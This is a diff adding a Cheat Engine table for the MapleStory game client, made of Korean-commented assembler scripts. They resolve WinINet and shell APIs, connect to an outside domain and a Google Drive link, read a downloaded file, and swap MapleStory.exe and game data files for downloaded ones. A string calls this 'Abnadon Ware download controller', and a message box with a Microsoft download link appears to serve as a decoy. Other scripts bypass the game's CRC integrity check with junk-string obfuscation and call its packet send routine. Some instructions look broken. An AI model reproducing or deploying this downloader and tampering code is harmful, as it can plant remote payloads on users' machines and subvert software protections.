@@ -1,0 +1,3686 @@
+<?xml version="1.0" encoding="utf-8"?>
+<CheatTable CheatEngineTableVersion="38">
+  <CheatEntries>
+    <CheatEntry>
+      <ID>294</ID>
+      <Description>"함수 제작기"</Description>
+      <Options moHideChildren="1"/>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+
+
+
+1805000:
+db '.\load64\mss32.img' 00 00 00 00 00 00
+1805060:
+db '.\load64\MapleStory.img' 00 00 00 00 00
+1805160:
+db 'MapleStory.img' 00 00 00 00 00
+18051C0:
+db 'MapleStory.exe' 00 00
+18051F5:
+db 'Download success' 0A 00
+18052C0:
+db '.X.exe' 00 00 00 00 00
+1805400:
+db '.\load64\MapleStory.img' 00 00 00 00 00
+01801050:
+db '.\load64\X.img' 00 00 00 00 00 00
+
+
+
+
+
+
+//jil15 create 01A00C10
+1805480:
+db '.\Data\Skill\MobSkill.img' 00
+18052C0:
+db 'X.exe' 00 00 00 00 00
+//consol list
+01400800:
+db 'CONOUT$' 00
+0146C700:
+db 0A 00
+0146C600:
+db 'w' 00
+//poitner list
+019E0FEE: //mainbaswe
+dd 019E0FFA
+019E0FFE: //start
+dd 01F01000
+define(dumpin,00C84400)
+Registersymbol(dumpin)
+define(downcontrol,01790240)
+Registersymbol(downcontrol)
+define(downlack,0171A82B)
+Registersymbol(downlack)
+define(DownCount,01430608)
+Registersymbol(DownCount)
+define(subpointers,01978EF1)
+Registersymbol(subpointers)
+define(domainX,01978F01)
+Registersymbol(domainX)
+define(diret,01401f00)
+Registersymbol(diret)
+define(diret2,01401F60)
+Registersymbol(diret2)
+label(put)
+define(datasub,01A08F80)
+Registersymbol(datasub)
+define(dllloads,01A00F80)
+Registersymbol(dllloads)
+define(dmomainapi,016FF350)
+Registersymbol(dmomainapi)
+define(inter,01400000)
+Registersymbol(inter)
+define(count,01608060)
+Registersymbol(count)
+define(subcount,01403008)
+Registersymbol(subcount)
+define(base,01608290)
+Registersymbol(base)
+define(Mesagas,01788027)
+Registersymbol(Mesagas)
+define(zerop,018C0769)
+Registersymbol(zerop)
+define(meesgeA,01506980)
+Registersymbol(meesgeA)
+define(zemogd,01506880)
+Registersymbol(zemogd)
+define(Resumes,00BFE9FC)
+Registersymbol(Resumes)
+define(ThreadGet,01787F8E)
+Registersymbol(ThreadGet)
+//defi//00C3BC39 txt = mss32.dll &lt;&lt; load
+define(MapleHands,00C3BC39)
+Registersymbol(MapleHands)
+define(loadL,00BFE9C0)
+Registersymbol(loadL)
+define(SuspendA,00BFEA00) //kkernel32.SuspendThread
+Registersymbol(SuspendA)
+define(dointer,0150402C) //kernel32.BaseThreadInitThunk+12
+Registersymbol(dointer)
+define(highter,0150502C) //kernel32.BaseThreadInitThunk+12
+Registersymbol(highter)
+define(PathPrintf,01413000)
+Registersymbol(PathPrintf)
+define(PathPrintf,01413000)
+Registersymbol(PathPrintf)
+define(domainpointer,017EA000) // domainPilter
+Registersymbol(domainpointer)
+define(domainPilter,017f3000) // domainPilter
+Registersymbol(domainPilter)
+define(domadata,01711000) // domainsaveaddress
+Registersymbol(domadata)
+define(saves,019E1002) // domainsaveaddress
+Registersymbol(saves)
+define(saves2,017E1002) // domainsaveaddress
+Registersymbol(saves2)
+
+define(ErrorV,01505CC0) // wininet.InternetCloseHandle
+Registersymbol(ErrorV)
+define(Errorapi,01850BDD) // wininet.InternetCloseHandle
+Registersymbol(Errorapi)
+define(interclsoe,00B10314) // wininet.InternetCloseHandle
+Registersymbol(interclsoe)
+define(crccontrol,018C105C) // crccontrolapiname
+Registersymbol(crccontrol)
+define(crcbase,018A0F47) // crcbase +1
+Registersymbol(crcbase)
+define(allooo,013fff00) // allooo
+Registersymbol(allooo)
+define(sendr,00B10300) // WININET.HttpSendRequestA }
+Registersymbol(sendr)
+define(sendr,00B10300) // WININET.HttpSendRequestA }
+Registersymbol(sendr)
+define(Requ,00B10310) // WININET.HttpOpenRequestA }
+Registersymbol(Requ)
+define(Conc,00B1030C)  //-wininet.InternetConnectA
+Registersymbol(Conc)
+define(closeh,00B100FC)  { -&gt;kernel32.CloseHandle }
+Registersymbol(closeh)
+define(handlev,013FEDE8) //handle
+Registersymbol(handlev)
+define(writef,00BFEA9C) //{ -&gt;kernel32.WriteFile }
+Registersymbol(writef)
+define(interread,01505024) ///WININET.InternetReadFile }
+Registersymbol(interread)
+define(addfilea,01505028) ////kernel32.movfilea
+Registersymbol(addfilea)
+define(creafd,00BFEA94) ////kernel32.CreateFileA
+Registersymbol(creafd)
+define(openrul,01505020) ////URL
+Registersymbol(openrul)
+define(openi,00B10304) ////WININET.InternetOpenA
+Registersymbol(openi)
+define(Thid,00BFE9F4) //// GetCurrentThreadId
+Registersymbol(Thid)
+define(Thid,00BFE9F4) //// GetCurrentThreadId
+Registersymbol(Thid)
+define(boxa,00B102CC) //USER32.MessageBoxA
+Registersymbol(boxa)
+define(opens,0150501C) //USER32.MessageBoxA shell32.ShellExecuteA
+Registersymbol(opens)
+define(my_zemog,013d3B43) //datalist
+Registersymbol(my_zemog)
+define(my_messg,013d3C43) //datalist
+Registersymbol(my_messg)
+define(apicall,013d3A43) //datalist
+Registersymbol(apicall)
+define(filename,013d3A43) //datalist
+Registersymbol(filename)
+define(skilldataGet,00C83B83) //datalist
+Registersymbol(skilldataGet)
+define(skilldataGet,00C83B83) //datalist
+Registersymbol(skilldataGet)
+define(apiX7F,00A7C710) //apicall
+Registersymbol(apiX7F)
+define(dataaad,00BFFBA8) //imginter
+Registersymbol(dataaad)
+define(xd,00BF5FEA) //Ma
+Registersymbol(xd)
+define(savaskill,013F00C1) //imginter
+Registersymbol(savaskill)
+define(Tir,013cFAD0) //imginter
+Registersymbol(Tir)
+define(based,0167E000) //sleep Won
+Registersymbol(based)
+define(api,00A730B8) //sleep Won
+Registersymbol(api)
+define(sleepde,00BFEA34) //sleep Won
+Registersymbol(sleepde)
+define(sleepde2,00B10178)//복붙 안됌;;;
+Registersymbol(sleepde2)
+define(subsleep,00B10178)
+Registersymbol(subsleep)
+define(crea,00B100C8) //CreateThread
+Registersymbol(crea)
+define(handle,00BFE9C8) //{ -&gt;kernel32.GetModuleHandleA }
+Registersymbol(handle)
+define(Getpro,00BFE9C4) //{ -&gt;kernel32.GetProcAddress }
+Registersymbol(Getpro)
+define(ker,00C3B45E) //{ -&gt;kernel32.GetProcAddress }
+Registersymbol(ker)//
+define(shi,00C3BC02) //shell32.dll
+Registersymbol(shi)//
+define(ntlist,01502600)
+Registersymbol(ntlist)
+define(allocd,01505600)
+Registersymbol(allocd)
+define(apic,01535200)
+Registersymbol(apic)
+define(apilist,01505000)
+Registersymbol(apilist)
+
+
+
+
+
+1901000:
+db 6a 01
+push 01801050
+push c3bc39
+call [01505028]
+push 200
+call [sleepde2]
+db 6a 01
+push c3bc39
+push 1805000
+call [01505028]
+db 6a 01
+push 18052C0
+push 18051C0
+call [01505028]
+push 200
+call [sleepde2]
+db 6a 01
+push 18051C0
+push 1805400
+call [01505028]
+ret
+
+
+my_zemog:
+db 27 BF A1 B7 AF 20 C4 DA B5 E5 20 34 43 34 27 00 20 C6 D0 00 00
+my_messg:
+db B1 CD C7 CF B4 C2 20 43 2B 2B C0 E7 B9 E8 C6 F7 20 C6 D0 C5 B0 C1 F6 B8 A6 20 BC B3 C4 A1 20 C7 CF BC C5 BE DF 20 C7 D5 B4 CF B4 D9 2E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+filename:
+db 'https://www.microsoft.com/ko-kr/download/details.aspx?id=48145' 00
+allocd-C0:
+db 'mss32.dll' 00
+allocd-80:
+db 'NameSpace.dll' 00
+allocd-40:
+db 'IsWow64Process' 00
+ntlist:
+db 'ntdll.dll' 00 25 64 20 0A 25 64
+allocd:
+db '_alloca_probe' 00
+
+allocd+40:
+db 'AllocConsole' 00
+ntlist+80:
+db 'msvcrt.dll' 00 25 64 20 0A 25 64
+allocd+80:
+db '__p__iob' 00
+ntlist+C0:
+db 'msvcrt.dll' 00 25 64 20 0A 25 64
+allocd+C0:
+db 'freopen' 00
+ntlist+100:
+db 'msvcrt.dll' 00 25 64 20 0A 25 64
+allocd+100:
+db 'printf' 00
+allocd+140:
+db 'TerminateThread' 00
+allocd+180:
+db 'MoveFileExA' 00
+allocd+1C0:
+db 'ShellExecuteA' 00
+
+ntlist+200:
+db 'wininet.dll' 00 25 64 20 0A 25 64
+allocd+200:
+db 'InternetOpenUrlA' 00
+ntlist+240:
+db 'wininet.dll' 00 25 64 20 0A 25 64
+allocd+240:
+db 'InternetReadFile' 00
+ntlist+280:
+db 'wininet.dll' 00 25 64 20 0A 25 64
+allocd+280:
+db 'MoveFileExA' 00
+
+allocd+2C0:
+db 'tes' 0
+allocd+300: //path
+db 'https://drive.google.com/file/d/1NnIw5RYCJhbP7QTmeBgQslqzbCt5A-5m/view?usp=sharing' 00
+allocd+400:
+db AC E1 AC E2 AC DA AC DE AC D6 AC E2 2E 6A 70 67 00 00 00//'100.img' 00 //filename
+allocd+490:
+dd 1
+allocd+4C0:
+dd 1203C947 //%x
+
+
+////////domain
+allocd+500: //01 010 1
+db 01 01 01 01 01 01 01 01 01 00 00 00
+
+allocd+540: // URL
+db 'InetURL/1.0' 00
+allocd+580: //20
+dd #32
+
+allocd+5C0: //dmomain
+db 'pccomd.kro.kr' 00
+
+01978EFD:
+dd allocd+5C0 //basefunfix
+subpointers:
+dd 01978EF1+C //pointeradd
+
+
+//db 'abandonw.tistory.com/' 00
+//db 'abandonw.tistory.com' 00
+
+allocd+600: //47
+dd #47
+
+allocd+640: //Get
+dd #5522759
+
+allocd+680:
+//dd #5522759
+allocd+6C0: //Get Error value
+//dd #5522759
+
+ //Dwonlaod string
+allocd+7C0:
+db 0A 'Abnadon Ware download controller is launched.' 0A 00
+
+allocd+8C0:
+db 'Data accumulator' 0A 00
+
+allocd+950:
+db 'MS api Inverse' 0A 00
+
+allocd+9C0:
+db 'all clear' 0A 00
+
+allocd+1000:
+//consu
+
+allocd+1040:
+//consu
+allocd+1080:
+//consu
+allocd+1380:
+//consu
+001801000: //sum
+db '.\Data\Skill\Dragon\cc.jpg' 00
+//allocd+1020
+zemogd:
+db BE F7 B5 A5 C0 CC C6 AE 20 56 65 72 2E 30 31 00 AE C0 C7 00 00
+meesgeA:
+db BB F5 20 B9 F6 C0 FC C0 CC 20 B3 AA BF D4 BD C0 B4 CF B4 D9 2E 0D 0A BE F7 B5 A5 C0 CC C6 AE B8 A6 20 BD C3 C0 DB C7 D5 B4 CF B4 D9 2E 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+
+saves:
+dd saves2
+
+saves+4:
+dd saves2+8900
+
+
+dllloads:
+db '.\load64\mfc140ud.dll' 0
+dllloads+40:
+db '.\load64\msvcp140d.dll' 0
+dllloads+80:
+db '.\load64\ucrtbased.dll' 0
+dllloads+C0:
+db '.\load64\vcruntime140d.dll' 0
+
+dllloads+100:
+db '.\load32\mfc140ud.dll' 0
+dllloads+140:
+db '.\load32\msvcp140d.dll' 0
+dllloads+180:
+db '.\load32\ucrtbased.dll' 0
+dllloads+1C0:
+db '.\load32\vcruntime140d.dll' 0
+
+
+diret2:
+push ebp
+mov ebp,esp
+sub esp,08
+mov [ebp-04],ecx
+mov eax,[ebp-04]
+mov [ebp-08],eax
+mov ecx,[ebp-04]
+movzx edx,byte ptr [ecx]
+test edx,edx
+je put
+call dword ptr [Thid]// GetCurrentThreadId
+jne put
+nop
+put:
+mov esp,ebp
+pop ebp
+ret
+
+diret:
+repne jne diret+5
+repne ret
+push ebp
+mov ebp,esp
+sub esp,00
+push eax
+
+
+
+define(te,015058C0)
+Registersymbol(te)
+define(filepa,01505900)
+Registersymbol(filepa)
+define(namesk,01505A00)
+Registersymbol(namesk)
+define(won,01505A90)
+Registersymbol(won)
+define(meta,01505AC0)
+Registersymbol(meta)
+
+
+apic:
+push allocd-40
+push ker //ker
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist-4],eax
+
+push allocd
+push ntlist
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist],eax
+
+
+
+push allocd+40
+push ker //ker
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist+4],eax
+push allocd+80
+push ntlist+80
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist+8],eax
+push allocd+C0
+push ntlist+C0
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist+C],eax
+push allocd+100
+push ntlist+100
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist+10],eax
+push allocd+140
+push ker //ker
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist+14],eax
+
+push allocd+180
+push ker //ker
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist+18],eax
+
+push allocd+1C0
+push shi //ker
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist+1C],eax
+push allocd+200
+push ntlist+200
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist+20],eax
+push allocd+240
+push ntlist+240
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist+24],eax
+
+push allocd+280
+push ker
+call dword ptr [handle]
+push eax
+call dword ptr [Getpro]
+mov [apilist+28],eax
+mov eax,[esp]
+mov [apilist+2C],eax
+ret
+
+createThread(apic)
+
+ 
+ 
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+      <CheatEntries>
+        <CheatEntry>
+          <ID>300</ID>
+          <Description>"ntdll.alloca_probe "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>308</ID>
+          <Description>"kernel32.AllocConsole "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>301</ID>
+          <Description>"msvcrt._p__iob "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>305</ID>
+          <Description>"msvcrt.freopen "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>306</ID>
+          <Description>"msvcrt.printf "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>307</ID>
+          <Description>"kernel32.TerminateThread "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>322</ID>
+          <Description>"MoveFileA"</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>325</ID>
+          <Description>"shell32.ShellExecuteA "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>333</ID>
+          <Description>"wininet.InternetOpenUrlA "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>01505020</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>334</ID>
+          <Description>"wininet.InternetReadFile "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>335</ID>
+          <Description>"kernel32.MoveFileA "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4+4+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>405</ID>
+          <Description>"kernel32.BaseThreadInitThunk+12"</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4+4+4+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>472</ID>
+          <Description>"kernel32.BaseThreadInitThunk+12"</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist-4</Address>
+        </CheatEntry>
+      </CheatEntries>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>509</ID>
+      <Description>"crc 스타트"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+define(crcs,600005E2)//00C84900)
+RegistersymboL(crcs)
+label(goto1)
+label(goto2)
+label(goto3)
+label(goto4)
+label(exit)
+label(HelloWorld)
+
+014fCFF7:
+dd 00
+dd 00//Packet
+dd 2//Size
+dd 00
+014fCFF7+4:
+dd 0040CFF7//PacketPointer //ff 74
+
+
+
+crcs:
+mov eax,00201000 //00A24F0C
+add eax,00200000
+jmp goto1
+db '35 223a235a23 4a 234a wer sd ewf afsda sdf asdf asdffsd wsdfsafw'
+goto1:
+xor esi,esi
+xx:
+cmp esi,00720000
+jae exit
+jmp goto2
+db 'sdgagadsgasdgasdagsddrfasasfasfsfafasasffasfas'
+goto2:
+mov ebx,[eax]
+jmp goto3
+db 'aouiyioyuuioyyuiooyuiioyuyuios23123131231231231233123ffasfas'
+goto3:
+//rol ebx,05
+jmp goto4
+db 'fghkfkghkfghkfghkfghfhkgfghkfghkfghksfasfsfafasasffasfas'
+goto4:
+//xor ebx,ebx
+xx2:
+mov edx,[00C85000+esi]
+rol ebx,04
+jmp goto5
+db 'fdgjggjfgjdfgjdffgjdasf41212441241224142dfgjdfgjdfgjfgdjfdgjsasfasfsfafasasffasfas'
+goto5:
+cmp edx,ebx
+jne 0
+add eax,04
+add esi,04
+jmp xx
+exit:
+xor edx,edx
+xor esi,esi
+xor eax,eax
+push HelloWorld
+mov ecx,[MapleStory.exe+7F9F50]
+push 014fCFF7//16bytes
+push HelloWorld//FakeReturn(ret)
+jmp 0049AC22//SendFunction //call address
+HelloWorld://End of Function
+ret
+db 90 90 CC CC CC CC CC CC CC CC CC CC CC C7
+
+
+createThread(600005E2)
+
+[DISABLE]
+</AssemblerScript>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>466</ID>
+      <Description>"함수 작동기 스타트"</Description>
+      <Options moHideChildren="1"/>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+
+define(dump,00C84600)
+Registersymbol(dump)
+define(dumpin,00C84400)
+Registersymbol(dumpin)
+label(stop)
+label(stop2)
+define(apisave1,00C84500)
+Registersymbol(apisave1)
+define(apisavedata,00BFEE1C) //bug alloc
+Registersymbol(apisavedata)
+
+dump:
+inc [dumpin+900]
+cmp [dumpin+900],#6000
+jae stop2
+cmp [dumpin+8FC],1
+je stop
+mov [dumpin+904],eax
+mov [dumpin+908],ebx
+mov [dumpin+90C],ecx
+mov [dumpin+910],edx
+mov [dumpin+914],edi
+mov [dumpin+918],esi
+mov [dumpin+91C],esp
+mov [dumpin+920],ebp
+xor eax,eax
+mov eax,00C84000-80000
+add eax,80000
+push 0
+push 0
+push eax
+push eax
+push 0
+push 0
+mov eax,[dumpin+904]
+call [crea]
+mov eax,[dumpin+904]
+mov ebx,[dumpin+908]
+mov ecx,[dumpin+90C]
+mov edx,[dumpin+910]
+mov edi,[dumpin+914]
+mov esi,[dumpin+918]
+mov esp,[dumpin+91C]
+mov ebp,[dumpin+920]
+xor eax,eax
+mov eax,01C84300-80000 //'ijl15.dll' 00 Get
+add eax,80000
+push 0
+push 0
+push eax
+push eax
+push 0
+push 0
+mov eax,[dumpin+904]
+call [crea]
+mov eax,[dumpin+904]
+mov ebx,[dumpin+908]
+mov ecx,[dumpin+90C]
+mov edx,[dumpin+910]
+mov edi,[dumpin+914]
+mov esi,[dumpin+918]
+mov esp,[dumpin+91C]
+mov ebp,[dumpin+920]
+xor eax,eax
+mov eax,ThreadGet-80000
+add eax,80000
+push 0
+push 0
+push eax
+push eax
+push 0
+push 0
+mov eax,[dumpin+904]
+call [crea]
+mov eax,[dumpin+904]
+mov ebx,[dumpin+908]
+mov ecx,[dumpin+90C]
+mov edx,[dumpin+910]
+mov edi,[dumpin+914]
+mov esi,[dumpin+918]
+mov esp,[dumpin+91C]
+mov ebp,[dumpin+920]
+
+xor eax,eax
+mov eax,01603037-80000
+add eax,80000
+push 0
+push 0
+push eax
+push eax
+push 0
+push 0
+mov eax,[dumpin+904]
+call [crea]
+mov eax,[dumpin+904]
+mov ebx,[dumpin+908]
+mov ecx,[dumpin+90C]
+mov edx,[dumpin+910]
+mov edi,[dumpin+914]
+mov esi,[dumpin+918]
+mov esp,[dumpin+91C]
+mov ebp,[dumpin+920]
+mov [dumpin+8FC],1
+stop:
+jmp [sleepde2]
+
+stop2:
+mov [dumpin+904],eax
+mov [dumpin+908],ebx
+mov [dumpin+90C],ecx
+mov [dumpin+910],edx
+mov [dumpin+914],edi
+mov [dumpin+918],esi
+mov [dumpin+91C],esp
+mov [dumpin+920],ebp
+xor eax,eax
+mov eax,[01A00C10]
+add eax,5E2 ///crc
+push 0
+push 0
+push eax
+push eax
+push 0
+push 0
+mov eax,[dumpin+904]
+call [crea]
+mov [dumpin+900],0
+mov eax,[dumpin+904]
+mov ebx,[dumpin+908]
+mov ecx,[dumpin+90C]
+mov edx,[dumpin+910]
+mov edi,[dumpin+914]
+mov esi,[dumpin+918]
+mov esp,[dumpin+91C]
+mov ebp,[dumpin+920]
+jmp [sleepde2]
+[DISABLE]
+
+</AssemblerScript>
+      <CheatEntries>
+        <CheatEntry>
+          <ID>467</ID>
+          <Description>"ntdll.alloca_probe "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>468</ID>
+          <Description>"kernel32.AllocConsole "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>469</ID>
+          <Description>"msvcrt._p__iob "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>470</ID>
+          <Description>"msvcrt.freopen "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>471</ID>
+          <Description>"msvcrt.printf "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>488</ID>
+          <Description>"kernel32.TerminateThread "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>489</ID>
+          <Description>"MoveFileA"</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>474</ID>
+          <Description>"shell32.ShellExecuteA "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>475</ID>
+          <Description>"wininet.InternetOpenUrlA "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>01505020</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>476</ID>
+          <Description>"wininet.InternetReadFile "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>477</ID>
+          <Description>"kernel32.MoveFileA "</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4+4+4+4+4+4</Address>
+        </CheatEntry>
+        <CheatEntry>
+          <ID>478</ID>
+          <Description>"kernel32.BaseThreadInitThunk+12"</Description>
+          <ShowAsHex>1</ShowAsHex>
+          <ShowAsSigned>1</ShowAsSigned>
+          <VariableType>4 Bytes</VariableType>
+          <Address>apilist+4+4+4+4+4+4+4+4+4+4+4</Address>
+        </CheatEntry>
+      </CheatEntries>
+    </CheatEntry>
+    <CheatEntry>
+      <ID>352</ID>
+      <Description>"도메인연동 오리지널"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+//createThread(dmomainapi)
+//dmomainapi+2c9es
+label(subhtt2)
+label(Endf)
+label(retd)
+label(retda)
+label(goto8)
+label(goto9)
+label(petds)
+label(goto11)
+label(goto12)
+label(incs)
+label(fufu)
+label(fufu2)
+label(fufu3)
+
+
+
+domadata:
+dd #10000
+dmomainapi:
+mov [dointer+4],eax
+mov [dointer+8],ebx
+mov [dointer+C],ecx
+mov [dointer+10],edx
+mov [dointer+14],edi
+mov [dointer+18],esi
+mov [dointer+1C],esp
+mov [dointer+20],ebp
+push ebp
+mov ebp,esp
+push -01
+mov eax,fs:[00000000]
+push eax
+mov eax,00011810
+call fufu
+push ebx
+push esi
+push edi
+lea edi,[ebp-0001181C]
+mov ecx,00004604
+mov eax,CCCCCCCC
+repe stosd
+xor eax,ebp
+mov [ebp-10],eax
+push eax
+lea eax,[ebp-0C]
+mov fs:[00000000],eax
+mov ecx,allocd+500// 01 01 01 01 01 01 01 01 01 00 00 00
+call diret2 // { -&gt;kernel32.GetCurrentThreadId }
+mov esi,esp
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push allocd+540 { ("InetURL/1.0") }
+call dword ptr [openi] { -&gt;WININET.InternetOpenA }
+cmp esi,esp
+call diret //repne jne
+mov [ebp-18],eax
+mov [allooo+8],eax
+mov esi,esp
+push 00 { 0 }
+push 00 { 0 }
+push 03 { 3 }
+push allocd+580{ (32) }
+push allocd+580 { (32) }
+push 50 { 80 }
+mov [dointer-18],esi
+mov [dointer-1C],ebx
+mov ebx,[subpointers-60]
+mov esi,[subpointers]
+mov esi,[esi+ebx]
+push esi
+add [subpointers-60],4
+mov esi,[dointer-18]
+mov ebx,[dointer-1C]
+subhtt2:
+mov eax,[ebp-18]
+push eax
+call dword ptr [Conc] { -&gt;WININET.InternetConnectA }
+cmp esi,esp
+call diret //repne jne
+mov [ebp-24],eax
+mov [allooo+4],eax
+mov esi,esp
+push 00 { 0 }
+push 00400000 { (9460301) }
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push allocd+600 { (47) }
+push allocd+640 { (5522759) } //Get
+mov eax,[ebp-24]
+push eax
+call dword ptr [Requ] { -&gt;WININET.HttpOpenRequestA }
+cmp esi,esp
+call diret
+mov [ebp-30],eax
+mov [allooo],eax
+lea ecx,[ebp-000111CC]
+mov [ebp-04],00000000 { 0 }
+mov esi,esp
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+mov eax,[ebp-30]
+push eax
+call dword ptr [sendr] { -&gt;WININET.HttpSendRequestA }////
+//////////////////////////////////
+putX:
+//call diret
+mov [ebp-000111D8],00000000{ 0 }
+mov [ebp-000111E4],00000000 { 0 }
+
+retd:
+mov esi,esp
+push domadata
+push #70000//사이즈
+mov [dointer-28],edi
+mov [dointer-2C],ebx
+mov ebx,[subpointers-60] //sub
+mov edi,[019E0FFA+ebx]
+push edi
+mov edi,[dointer-28]
+mov ebx,[dointer-2C]
+mov edx,[ebp-30]
+push edx //클로즈할 핸들러
+call dword ptr [interread] // { -&gt;WININET.InternetReadFile }
+mov ebx,[subpointers-60] //sub
+mov edi,[019E0FFA+ebx]
